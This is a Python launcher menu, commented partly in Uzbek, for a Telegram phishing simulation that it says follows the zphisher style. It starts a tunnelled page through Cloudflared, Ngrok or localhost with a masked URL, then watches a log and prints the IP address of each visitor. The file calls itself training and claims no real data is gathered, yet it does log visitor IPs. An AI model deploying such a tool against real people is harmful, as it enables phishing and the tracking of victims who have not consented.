#!/usr/bin/env python3
"""
Telegram Training Menu — zphisher uslubida, faqat ta'lim simulyatsiyasi.
Avtomatik Cloudflared havola + mask URL + Telegram bot.
"""

import os
import subprocess
import sys
import time
from pathlib import Path

PROJECT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_DIR))

CYAN = "\033[36m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
NC = "\033[0m"


def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{CYAN}")
    print("  [::] Cyber Hygiene Training — Telegram Mode [::]")
    print(f"{NC}")
    print(f"  {YELLOW}[01]{NC} Telegram Simulyatsiya (Cloudflared — avto havola)")
    print(f"  {YELLOW}[02]{NC} Telegram Simulyatsiya (Ngrok)")
    print(f"  {YELLOW}[03]{NC} Telegram Simulyatsiya (LocalHost)")
    print(f"  {YELLOW}[99]{NC} About")
    print(f"  {YELLOW}[00]{NC} Exit")
    print()


def watch_visits():
    """Terminalda tashriflarni kuzatish — zphisher 'Victim IP Found' uslubi."""
    visits_file = PROJECT_DIR / "data" / "visits.log"
    last_size = 0
    print(f"{GREEN}[-] Waiting for visits, Ctrl+C to exit...{NC}\n")
    try:
        while True:
            if visits_file.exists():
                size = visits_file.stat().st_size
                if size > last_size:
                    new = visits_file.read_text(encoding="utf-8")[last_size:]
                    for line in new.strip().split("\n"):
                        if "IP:" in line:
                            ip = line.split("IP:")[1].split("|")[0].strip()
                            print(f"{GREEN}[-] Participant IP Found !{NC}")
                            print(f"{GREEN}[-] IP : {ip}{NC}")
                            print(f"{GREEN}[-] Saved in : auth/ip.txt{NC}\n")
                    last_size = size
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[-] Monitoring stopped.{NC}")


def main():
    banner()
    try:
        opt = input(f"  {RED}[-]{NC} Select an option : ").strip() or "01"
    except (EOFError, KeyboardInterrupt):
        return

    if opt in ("00", "0"):
        return

    if opt == "99":
        print("\n  Ta'lim simulyatsiyasi — haqiqiy ma'lumot yig'ilmaydi.")
        print("  Telegram bot havolani avtomatik beradi.\n")
        return

    tunnel_map = {"01": "2", "1": "2", "02": "3", "2": "3", "03": "1", "3": "1"}
    tunnel = tunnel_map.get(opt, "2")

    launcher = PROJECT_DIR / "scripts" / "launcher.py"
    py = sys.executable

    print(f"\n{CYAN}[-] Initializing Telegram training...{NC}\n")
    subprocess.run([py, str(launcher), "start", "--tunnel", tunnel], cwd=str(PROJECT_DIR))

    watch_visits()


if __name__ == "__main__":
    main()
